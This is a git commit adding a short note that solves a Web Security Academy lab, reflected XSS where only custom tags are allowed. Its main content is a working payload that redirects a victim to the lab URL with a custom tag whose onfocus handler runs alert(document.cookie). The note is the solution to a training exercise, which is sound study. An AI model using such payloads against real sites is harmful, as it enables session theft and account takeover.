cbecc1a82644059add46a5468e1f8b2e34afb542
Paula Fernandes <paula@MacBook-Air-de-Paula.local>
2022-01-22 19:08:59 -0300

    reflected with custom

---
+++ xss/local_tests/Reflected_XSS_into_HTML_context_with_all_tags_blocked_except_custom_ones.js
@@ -0,0 +1,9 @@
+
+1. Write the exploit payload at the exploit server and delivery it.
+
+<script>
+
+window.location = "https://ac6c1fe31ed28be9c0ae47cd0077000c.web-security-academy.net/?search=%3Cpaula%20id%3dyouranchroid%20onfocus%3dalert%28document%2ecookie%29%20tabindex%3d1%3E#youranchroid";
+
+
+</script>
